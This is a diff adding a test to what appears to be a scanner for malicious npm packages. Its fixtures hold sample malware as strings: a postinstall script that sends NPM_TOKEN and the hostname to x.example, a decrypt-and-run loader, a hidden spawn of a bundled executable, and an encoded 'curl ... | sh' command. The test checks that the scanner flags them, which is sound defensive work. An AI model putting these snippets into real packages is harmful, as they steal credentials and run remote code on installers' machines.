@@ -375,6 +375,38 @@ test("long lines cannot stall the scan (no catastrophic backtracking)", async ()
   assert.ok(performance.now() - t0 < 15000, `scan took ${Math.round(performance.now() - t0)} ms`);
 });
 
+test("install code hidden in other files, encodings and shipped programs", async () => {
+  const pkg = (scripts, extra = {}) => JSON.stringify({ name: "acme-tool", version: "1.0.0", scripts, ...extra });
+  const steal = j("const os = require('os'); const https = require('https');\nhttps.get('https://x.example/' + os.hostname() + '/' + process.env.NPM_TO", "KEN);\n");
+  const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(Array.from({ length: 10 }, (_, i) => `var _0x${(0xa1b2 + i).toString(16)} = ${i};`).join("\n"), "utf16le")]);
+  const cases = {
+    "install-time-capabilities (required file)": { "package.json": pkg({ postinstall: "node setup.js" }), "setup.js": "require('./lib/run');\n", "lib/run.js": steal },
+    "install-time-capabilities (node .)": { "package.json": pkg({ postinstall: "node ." }, { main: "main.js" }), "main.js": steal },
+    "install-runs-test-file": { "package.json": pkg({ preinstall: "node ./test/fixtures/setup.js" }), "test/fixtures/setup.js": "console.log(1)\n" },
+    "install-runs-bundled-program": { "package.json": pkg({ postinstall: "node index.js" }), "index.js": "require('child_process').spawn(require('path').resolve('Setup.exe'), { detached: true });\n" },
+    "mal-decrypt-then-run": { "loader.js": "const c = require('crypto').createDecipheriv('aes-256-cbc', k, iv);\nlet s = c.update(data, 'base64', 'utf8') + c.final('utf8');\nnew Function('require', s)(require);\n" },
+    "mal-obfuscator (UTF-16 file)": { "dist/app.js": utf16 },
+  };
+  for (const [name, files] of Object.entries(cases)) {
+    const id = name.split(" ")[0];
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vetcode-"));
+    for (const [rel, body] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true }); fs.writeFileSync(path.join(dir, rel), body); }
+    const r = await run(dir, { noIgnore: true });
+    assert.ok(r.findings.some(f => f.rule === id && f.confidence !== "low"), name);
+  }
+  const code = "const {exec}=require('child_process');\nconst os=require('os');\nexec('curl -s http://x.example/p?h='+os.hostname()+' | sh');\n";
+  const hexOfB64 = Buffer.from(Buffer.from(code).toString("base64")).toString("hex");
+  const r = await run(project({ "x.js": `const p = '${hexOfB64}';\nmodule.exports = p;\n` }), { noIgnore: true });
+  assert.ok(r.findings.some(f => / \(hidden\)$/.test(f.title)), "hex of base64 code is decoded and scanned");
+
+  const clean = await run(project({
+    "package.json": pkg({ postinstall: "node scripts/postinstall.js" }), "scripts/postinstall.js": "require('./banner');\n", "scripts/banner.js": "console.log('Thanks for installing');\n",
+    "notify.js": "require('child_process').spawn(require('path').join(__dirname, 'vendor', 'SnoreToast.exe'), args);\n",
+    "img.js": `export const logo = "${Buffer.from(Array.from({ length: 400 }, (_, i) => i % 256)).toString("base64")}";\n`,
+  }), { noIgnore: true });
+  assert.deepEqual(clean.findings.filter(f => ["install-time-capabilities", "install-time-network", "install-runs-bundled-program", "install-runs-test-file"].includes(f.rule) || / \(hidden\)$/.test(f.title)).map(f => `${f.rule} ${f.file}`), []);
+});
+
 test("CLI prints a report and --fail-on sets the exit code", () => {
   const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
   const cli = path.resolve("skills/vetcode/scripts/vet.mjs");
